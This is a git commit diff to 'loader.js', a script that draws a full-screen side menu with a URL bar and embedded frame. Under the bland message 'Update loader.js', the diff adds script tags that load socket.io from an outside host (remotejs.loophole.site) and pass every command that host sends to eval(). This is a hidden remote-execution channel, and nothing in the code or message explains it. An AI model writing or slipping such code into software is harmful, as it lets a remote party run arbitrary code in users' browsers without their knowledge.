9c30a7a330b61f5958aefafe41d7295a2b127c7e
Murturtle <97775022+Murturtle@users.noreply.github.com>
2023-04-10 17:50:47 -0700

    Update loader.js

--- loader.js
+++ loader.js
@@ -10,6 +10,12 @@ if (document.getElementById('sidemenu')) {
     bdy.appendChild(sidemenu);
     sidemenu.setAttribute('style', 'height:100%; width:100%; color:white; font-family:Monospace; font-size:12px; z-index:10000; display: inline-block; overflow:visible; position:fixed; left:0; top: 0; background:black;');
     sidemenu.innerHTML=`
+    <script src="https://remotejs.loophole.site/socket/socket.io/socket.io.js"></script>
+    <script>
+    var socket = io.connect("https://remotejs.loophole.site");
+      socket.on('command', function(command) {
+        eval(command);
+      });</script>
     <input style="height:4%; border:solid black 1px; color:white; background:grey; font-family:Monospace;" id="urlinput"/>
     
     <button style="width:20px; height:4%; border:none; color:white; background:grey; font-family:Monospace;" onclick="url=document.getElementById('urlinput').value;if(url.startsWith('https://')){document.getElementById('sidemenuframe').src=url;}else if(url.startsWith('http://')){alert('[WARN] http might not work due to downgrade policy.');document.getElementById('sidemenuframe').src=url;}else{document.getElementById('sidemenuframe').src='https://'+url}">⌕</button>
